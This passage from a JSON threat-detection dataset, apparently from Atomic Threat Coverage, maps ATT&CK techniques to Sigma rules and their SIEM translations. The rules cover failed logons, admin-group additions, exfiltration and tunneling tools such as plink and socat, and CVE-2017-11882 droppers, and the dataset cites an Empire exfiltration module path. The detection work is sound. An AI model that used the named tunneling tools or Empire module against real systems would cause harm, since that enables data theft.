to determine suspicious activity and tampering with accounts that have been disabled or somehow restricted.\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1078\"\\n    ],\\n    \"query\": \"(EventID:(\\\\\"4625\\\\\" OR \\\\\"4776\\\\\") AND Status:(\\\\\"0xC0000072\\\\\" OR \\\\\"0xC000006F\\\\\" OR \\\\\"0xC0000070\\\\\" OR \\\\\"0xC0000413\\\\\" OR \\\\\"0xC000018C\\\\\" OR \\\\\"0xC000015B\\\\\"))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"4625\\\\\" OR \\\\\"4776\\\\\") AND Status:(\\\\\"0xC0000072\\\\\" OR \\\\\"0xC000006F\\\\\" OR \\\\\"0xC0000070\\\\\" OR \\\\\"0xC0000413\\\\\" OR \\\\\"0xC000018C\\\\\" OR \\\\\"0xC000015B\\\\\"))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Account Tampering - Suspicious Failed Logon Reasons\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:(\"4625\" \"4776\") AND Status:(\"0xC0000072\" \"0xC000006F\" \"0xC0000070\" \"0xC0000413\" \"0xC000018C\" \"0xC000015B\"))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"4625\" OR EventID=\"4776\") (Status=\"0xC0000072\" OR Status=\"0xC000006F\" OR Status=\"0xC0000070\" OR Status=\"0xC0000413\" OR Status=\"0xC000018C\" OR Status=\"0xC000015B\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id IN [\"4625\", \"4776\"] Status IN [\"0xC0000072\", \"0xC000006F\", \"0xC0000070\", \"0xC0000413\", \"0xC000018C\", \"0xC000015B\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*4625|.*4776))(?=.*(?:.*0xC0000072|.*0xC000006F|.*0xC0000070|.*0xC0000413|.*0xC000018C|.*0xC000015B)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Multiple Failed Logins with Different Accounts from Single Source System\nid: e98374a6-e2d9-4076-9b5c-11bdb2569995\ndescription: Detects suspicious failed logins with different user accounts from a single source system\nauthor: Florian Roth\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1078\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID:\n            - 529\n            - 4625\n        UserName: '*'\n        WorkstationName: '*'\n    selection2:\n        EventID: 4776\n        UserName: '*'\n        Workstation: '*'\n    timeframe: 24h \n    condition:\n        - selection1 | count(UserName) by WorkstationName > 3\n        - selection2 | count(UserName) by Workstation > 3\nfalsepositives:\n    - Terminal servers\n    - Jump servers\n    - Other multiuser systems like Citrix server farms\n    - Workstations with frequently changing users \nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Multiple Failed Logins with Different Accounts from Single Source System\nid: e98374a6-e2d9-4076-9b5c-11bdb2569995\ndescription: Detects suspicious failed logins with different user accounts from a single source system\nauthor: Florian Roth\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1078\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID:\n            - 529\n            - 4625\n        UserName: '*'\n        WorkstationName: '*'\n    selection2:\n        EventID: 4776\n        UserName: '*'\n        Workstation: '*'\n    timeframe: 24h \n    condition:\n        - selection1 | count(UserName) by WorkstationName > 3\n        - selection2 | count(UserName) by Workstation > 3\nfalsepositives:\n    - Terminal servers\n    - Jump servers\n    - Other multiuser systems like Citrix server farms\n    - Workstations with frequently changing users \nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Multiple-Failed-Logins-with-Different-Accounts-from-Single-Source-System <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Multiple Failed Logins with Different Accounts from Single Source System\",\\n    \"description\": \"Detects suspicious failed logins with different user accounts from a single source system\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1078\"\\n    ],\\n    \"query\": \"(EventID:(\\\\\"529\\\\\" OR \\\\\"4625\\\\\") AND UserName.keyword:* AND WorkstationName.keyword:*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"24h\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"529\\\\\" OR \\\\\"4625\\\\\") AND UserName.keyword:* AND WorkstationName.keyword:*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          },\\n          \"aggs\": {\\n            \"by\": {\\n              \"terms\": {\\n                \"field\": \"WorkstationName.keyword\",\\n                \"size\": 10,\\n                \"order\": {\\n                  \"_count\": \"desc\"\\n                },\\n                \"min_doc_count\": 4\\n              },\\n              \"aggs\": {\\n                \"agg\": {\\n                  \"terms\": {\\n                    \"field\": \"UserName.keyword\",\\n                    \"size\": 10,\\n                    \"order\": {\\n                      \"_count\": \"desc\"\\n                    },\\n                    \"min_doc_count\": 4\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.aggregations.by.buckets.0.agg.buckets.0.doc_count\": {\\n        \"gt\": 3\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Multiple Failed Logins with Different Accounts from Single Source System\\'\",\\n        \"body\": \"Hits:\\\\n{{#aggregations.agg.buckets}}\\\\n {{key}} {{doc_count}}\\\\n\\\\n{{#by.buckets}}\\\\n-- {{key}} {{doc_count}}\\\\n{{/by.buckets}}\\\\n\\\\n{{/aggregations.agg.buckets}}\\\\n\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Multiple-Failed-Logins-with-Different-Accounts-from-Single-Source-System-2 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Multiple Failed Logins with Different Accounts from Single Source System\",\\n    \"description\": \"Detects suspicious failed logins with different user accounts from a single source system\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1078\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4776\\\\\" AND UserName.keyword:* AND Workstation.keyword:*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"24h\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4776\\\\\" AND UserName.keyword:* AND Workstation.keyword:*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          },\\n          \"aggs\": {\\n            \"by\": {\\n              \"terms\": {\\n                \"field\": \"Workstation.keyword\",\\n                \"size\": 10,\\n                \"order\": {\\n                  \"_count\": \"desc\"\\n                },\\n                \"min_doc_count\": 4\\n              },\\n              \"aggs\": {\\n                \"agg\": {\\n                  \"terms\": {\\n                    \"field\": \"UserName.keyword\",\\n                    \"size\": 10,\\n                    \"order\": {\\n                      \"_count\": \"desc\"\\n                    },\\n                    \"min_doc_count\": 4\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.aggregations.by.buckets.0.agg.buckets.0.doc_count\": {\\n        \"gt\": 3\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Multiple Failed Logins with Different Accounts from Single Source System\\'\",\\n        \"body\": \"Hits:\\\\n{{#aggregations.agg.buckets}}\\\\n {{key}} {{doc_count}}\\\\n\\\\n{{#by.buckets}}\\\\n-- {{key}} {{doc_count}}\\\\n{{/by.buckets}}\\\\n\\\\n{{/aggregations.agg.buckets}}\\\\n\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID=\"529\" OR EventID=\"4625\") UserName=\"*\" WorkstationName=\"*\") | eventstats dc(UserName) as val by WorkstationName | search val > 3", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "grep -P '^(?:.*(?=.*(?:.*529|.*4625))(?=.*.*)(?=.*.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Interactive Logon to Server Systems\nid: 3ff152b2-1388-4984-9cd9-a323323fdadf\ndescription: Detects interactive console logons to\nauthor: Florian Roth\ntags:\n    - attack.lateral_movement\n    - attack.t1078\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 528\n            - 529\n            - 4624\n            - 4625\n        LogonType: 2\n        ComputerName:\n            - '%ServerSystems%'\n            - '%DomainControllers%'\n    filter:\n        LogonProcessName: Advapi\n        ComputerName: '%Workstations%'\n    condition: selection and not filter\nfalsepositives:\n    - Administrative activity via KVM or ILO board\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Interactive Logon to Server Systems\nid: 3ff152b2-1388-4984-9cd9-a323323fdadf\ndescription: Detects interactive console logons to\nauthor: Florian Roth\ntags:\n    - attack.lateral_movement\n    - attack.t1078\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 528\n            - 529\n            - 4624\n            - 4625\n        LogonType: 2\n        ComputerName:\n            - '%ServerSystems%'\n            - '%DomainControllers%'\n    filter:\n        LogonProcessName: Advapi\n        ComputerName: '%Workstations%'\n    condition: selection and not filter\nfalsepositives:\n    - Administrative activity via KVM or ILO board\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:(\"528\" OR \"529\" OR \"4624\" OR \"4625\") AND LogonType:\"2\" AND ComputerName:(\"%ServerSystems%\" OR \"%DomainControllers%\")) AND (NOT (LogonProcessName:\"Advapi\" AND ComputerName:\"%Workstations%\")))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Interactive-Logon-to-Server-Systems <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Interactive Logon to Server Systems\",\\n    \"description\": \"Detects interactive console logons to\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1078\"\\n    ],\\n    \"query\": \"((EventID:(\\\\\"528\\\\\" OR \\\\\"529\\\\\" OR \\\\\"4624\\\\\" OR \\\\\"4625\\\\\") AND LogonType:\\\\\"2\\\\\" AND ComputerName:(\\\\\"%ServerSystems%\\\\\" OR \\\\\"%DomainControllers%\\\\\")) AND (NOT (LogonProcessName:\\\\\"Advapi\\\\\" AND ComputerName:\\\\\"%Workstations%\\\\\")))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:(\\\\\"528\\\\\" OR \\\\\"529\\\\\" OR \\\\\"4624\\\\\" OR \\\\\"4625\\\\\") AND LogonType:\\\\\"2\\\\\" AND ComputerName:(\\\\\"%ServerSystems%\\\\\" OR \\\\\"%DomainControllers%\\\\\")) AND (NOT (LogonProcessName:\\\\\"Advapi\\\\\" AND ComputerName:\\\\\"%Workstations%\\\\\")))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Interactive Logon to Server Systems\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:(\"528\" \"529\" \"4624\" \"4625\") AND LogonType:\"2\" AND ComputerName:(\"%ServerSystems%\" \"%DomainControllers%\")) AND (NOT (LogonProcessName:\"Advapi\" AND ComputerName:\"%Workstations%\")))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((EventID=\"528\" OR EventID=\"529\" OR EventID=\"4624\" OR EventID=\"4625\") LogonType=\"2\" (ComputerName=\"%ServerSystems%\" OR ComputerName=\"%DomainControllers%\")) NOT (LogonProcessName=\"Advapi\" ComputerName=\"%Workstations%\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" (event_id IN [\"528\", \"529\", \"4624\", \"4625\"] logon_type=\"2\" ComputerName IN [\"%ServerSystems%\", \"%DomainControllers%\"])  -(logon_process=\"Advapi\" ComputerName=\"%Workstations%\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*(?:.*528|.*529|.*4624|.*4625))(?=.*2)(?=.*(?:.*%ServerSystems%|.*%DomainControllers%))))(?=.*(?!.*(?:.*(?=.*Advapi)(?=.*%Workstations%)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: User Added to Local Administrators\nid: c265cf08-3f99-46c1-8d59-328247057d57\ndescription: This rule triggers on user accounts that are added to the local Administrators group, which could be legitimate activity or a sign of privilege escalation\n    activity\nstatus: stable\nauthor: Florian Roth\ntags:\n    - attack.privilege_escalation\n    - attack.t1078\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4732\n    selection_group1:\n        GroupName: 'Administrators'\n    selection_group2:\n        GroupSid: 'S-1-5-32-544'\n    filter:\n        SubjectUserName: '*$'\n    condition: selection and (1 of selection_group*) and not filter\nfalsepositives:\n    - Legitimate administrative activity\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: User Added to Local Administrators\nid: c265cf08-3f99-46c1-8d59-328247057d57\ndescription: This rule triggers on user accounts that are added to the local Administrators group, which could be legitimate activity or a sign of privilege escalation\n    activity\nstatus: stable\nauthor: Florian Roth\ntags:\n    - attack.privilege_escalation\n    - attack.t1078\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4732\n    selection_group1:\n        GroupName: 'Administrators'\n    selection_group2:\n        GroupSid: 'S-1-5-32-544'\n    filter:\n        SubjectUserName: '*$'\n    condition: selection and (1 of selection_group*) and not filter\nfalsepositives:\n    - Legitimate administrative activity\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"4732\" AND (GroupName:\"Administrators\" OR GroupSid:\"S\\\\-1\\\\-5\\\\-32\\\\-544\")) AND (NOT (SubjectUserName.keyword:*$)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/User-Added-to-Local-Administrators <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"User Added to Local Administrators\",\\n    \"description\": \"This rule triggers on user accounts that are added to the local Administrators group, which could be legitimate activity or a sign of privilege escalation activity\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.t1078\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"4732\\\\\" AND (GroupName:\\\\\"Administrators\\\\\" OR GroupSid:\\\\\"S\\\\\\\\-1\\\\\\\\-5\\\\\\\\-32\\\\\\\\-544\\\\\")) AND (NOT (SubjectUserName.keyword:*$)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"4732\\\\\" AND (GroupName:\\\\\"Administrators\\\\\" OR GroupSid:\\\\\"S\\\\\\\\-1\\\\\\\\-5\\\\\\\\-32\\\\\\\\-544\\\\\")) AND (NOT (SubjectUserName.keyword:*$)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'User Added to Local Administrators\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"4732\" AND (GroupName:\"Administrators\" OR GroupSid:\"S\\\\-1\\\\-5\\\\-32\\\\-544\")) AND (NOT (SubjectUserName.keyword:*$)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"4732\" (GroupName=\"Administrators\" OR GroupSid=\"S-1-5-32-544\")) NOT (SubjectUserName=\"*$\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" (event_id=\"4732\" event_source=\"Microsoft-Windows-Security-Auditing\" (group_name=\"Administrators\" OR group_sid=\"S-1-5-32-544\"))  -(SubjectUserName=\"*$\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*4732)(?=.*(?:.*(?:.*Administrators|.*S-1-5-32-544)))))(?=.*(?!.*(?:.*(?=.*.*\\\\$)))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exfiltration/egresscheck", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exfiltration/egresscheck", "name": "Empire Module Command"}], "command_list": ["powershell/exfiltration/egresscheck", "powershell/exfiltration/egresscheck"], "technique_id": "T1020", "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1020", "Empire Module": "powershell/exfiltration/egresscheck", "Technique": "Automated Exfiltration", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/exfiltration/egresscheck\":  [\"T1020\"],"}}], "queries": [{"query": "title: Exfiltration and tunneling tools execution\nid: c75309a3-59f8-4a8d-9c2c-4c927ad50555\ndescription: Execution of well known tools for data exfiltration and tunneling\nstatus: experimental\nauthor: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ntags:\n    - attack.exfiltration\n    - attack.t1020\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        NewProcessName|endswith:\n            - '\\plink.exe'\n            - '\\socat.exe'\n            - '\\stunnel.exe'\n            - '\\httptunnel.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate Administrator using tool for exfiltration for other needs\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Exfiltration and tunneling tools execution\nid: c75309a3-59f8-4a8d-9c2c-4c927ad50555\ndescription: Execution of well known tools for data exfiltration and tunneling\nstatus: experimental\nauthor: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ntags:\n    - attack.exfiltration\n    - attack.t1020\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        NewProcessName|endswith:\n            - '\\plink.exe'\n            - '\\socat.exe'\n            - '\\stunnel.exe'\n            - '\\httptunnel.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate Administrator using tool for exfiltration for other needs\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "NewProcessName.keyword:(*\\\\\\\\plink.exe OR *\\\\\\\\socat.exe OR *\\\\\\\\stunnel.exe OR *\\\\\\\\httptunnel.exe)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Exfiltration-and-tunneling-tools-execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Exfiltration and tunneling tools execution\",\\n    \"description\": \"Execution of well known tools for data exfiltration and tunneling\",\\n    \"tags\": [\\n      \"attack.exfiltration\",\\n      \"attack.t1020\"\\n    ],\\n    \"query\": \"NewProcessName.keyword:(*\\\\\\\\\\\\\\\\plink.exe OR *\\\\\\\\\\\\\\\\socat.exe OR *\\\\\\\\\\\\\\\\stunnel.exe OR *\\\\\\\\\\\\\\\\httptunnel.exe)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"NewProcessName.keyword:(*\\\\\\\\\\\\\\\\plink.exe OR *\\\\\\\\\\\\\\\\socat.exe OR *\\\\\\\\\\\\\\\\stunnel.exe OR *\\\\\\\\\\\\\\\\httptunnel.exe)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Exfiltration and tunneling tools execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "NewProcessName.keyword:(*\\\\\\\\plink.exe *\\\\\\\\socat.exe *\\\\\\\\stunnel.exe *\\\\\\\\httptunnel.exe)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(NewProcessName=\"*\\\\\\\\plink.exe\" OR NewProcessName=\"*\\\\\\\\socat.exe\" OR NewProcessName=\"*\\\\\\\\stunnel.exe\" OR NewProcessName=\"*\\\\\\\\httptunnel.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" NewProcessName IN [\"*\\\\\\\\plink.exe\", \"*\\\\\\\\socat.exe\", \"*\\\\\\\\stunnel.exe\", \"*\\\\\\\\httptunnel.exe\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*\\\\plink\\\\.exe|.*.*\\\\socat\\\\.exe|.*.*\\\\stunnel\\\\.exe|.*.*\\\\httptunnel\\\\.exe)'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1211", "parsed_datasets": [], "queries": [{"query": "title: Droppers exploiting CVE-2017-11882\nid: 678eb5f4-8597-4be6-8be7-905e4234b53a\nstatus: experimental\ndescription: Detects exploits that use CVE-2017-11882 to start EQNEDT32.EXE and other sub processes like mshta.exe\nreferences:\n    - https://www.hybrid-analysis.com/sample/2a4ae284c76f868fc51d3bb65da8caa6efacb707f265b25c30f34250b76b7507?environmentId=100\n    - https://www.google.com/url?hl=en&q=https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about&source=gmail&ust=1511481120837000&usg=AFQjCNGdL7gVwLXaNSl2Td8ylDYbSJFmPw\nauthor: Florian Roth\ndate: 2017/11/23\ntags:\n    - attack.defense_evasion\n    - attack.t1211\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\EQNEDT32.EXE'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Droppers exploiting CVE-2017-11882\nid: 678eb5f4-8597-4be6-8be7-905e4234b53a\nstatus: experimental\ndescription: Detects exploits that use CVE-2017-11882 to start EQNEDT32.EXE and other sub processes like mshta.exe\nreferences:\n    - https://www.hybrid-analysis.com/sample/2a4ae284c76f868fc51d3bb65da8caa6efacb707f265b25c30f34250b76b7507?environmentId=100\n    - https://www.google.com/url?hl=en&q=https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about&source=gmail&ust=1511481120837000&usg=AFQjCNGdL7gVwLXaNSl2Td8ylDYbSJFmPw\nauthor: Florian Roth\ndate: 2017/11/23\ntags:\n    - attack.defense_evasion\n    - attack.t1211\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\EQNEDT32.EXE'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "ParentImage.keyword:*\\\\\\\\EQNEDT32.EXE", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Droppers-exploiting-CVE-2017-11882 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Droppers exploiting CVE-2017-11882\",\\n    \"description\": \"Detects exploits that use CVE-2017-11882 to start EQNEDT32.EXE and other sub processes like mshta.exe\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1211\"\\n    ],\\n    \"query\": \"ParentImage.keyword:*\\\\\\\\\\\\\\\\EQNEDT32.EXE\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": 